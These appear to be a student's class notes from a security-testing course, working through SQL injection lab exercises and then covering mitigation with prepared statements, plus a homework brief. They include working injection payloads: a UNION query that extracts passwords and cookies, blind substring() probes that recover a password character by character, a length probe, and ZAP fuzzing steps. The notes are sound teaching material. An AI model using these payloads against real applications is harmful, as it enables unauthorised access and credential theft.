* solve togheter home-work 1
* SQL mitigation

-----------------------------------------------
## ex 3

one with concatenate query
`
shit
`
one with union
`
' UNION SELECT userid, name, password, cookie, null, null, null FROM user_system_data WHERE '1' = '1
`
## ex 5

register a new user
`
fake' AND substring(password, 1, 8) = 'password' --
`
```
; binary search, divide et impera
tom' AND substring(password, 1, 1) > 'h' --  // true
tom' AND substring(password, 1, 1) > 'q' --  // true
tom' AND substring(password, 1, 1) > 't' --  // false
tom' AND substring(password, 1, 1) = 't' --  // true

tom' AND substring(password, 2, 1) > 'h' --  // false
tom' AND substring(password, 2, 1) = 'h' --  // true
```
and so on...

OR use zap
open firefox proxy 
to log our request: do the request by hand, find in the history the request and open with manuale request editor 
OR 
find in the history the request and open it with attack-> fuzz
highlight what needs to change and clic add, then write all the alphabet needed, when higlight the number and user numberzz where clicking add.


to know the password length
`
tom' and length(password)=22 --
`

-------------------------------------------------
---------------------------------------------
slides

fix SQL injection
> prepared statements/parameterized queries

## prepared statements 
use the question mark as a placeholder for the query.
and write the list of parameters.

## parametrize queries



https://github.com/emavgl/sqli_mitigation_exercise
1 or 1=1 


-----------------------------------

homework-2
https://github.com/emavgl/sectest_homework_2
find SQL injections and fix them with prepared statement
one exploit
one fix
one non exploit
deliver through google form